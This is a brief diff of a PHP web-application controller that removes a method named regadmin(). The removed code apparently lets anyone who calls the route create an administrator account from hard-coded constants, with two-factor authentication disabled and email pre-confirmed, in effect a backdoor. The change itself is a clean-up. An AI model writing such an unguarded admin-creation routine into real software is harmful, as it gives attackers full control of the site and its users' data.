@@ -963,18 +963,5 @@ HTML;
         die;
 	}
     
-    public function regadmin() {
-         $this->autoRender = false;
-       $ref_array=[
-            "username"=>AD_UN,
-            "first_name"=>'Admin',
-            "last_name"=>'Forge',
-            "user_type_id"=>AD_ID,
-            "password"=>AD_PWD,
-            "2fa"=>0,
-            "ref_id"=>'admin',
-            "email_confirmed"=>1,
-        ];
-        $this->User->save($ref_array);
-	}
+    
 }
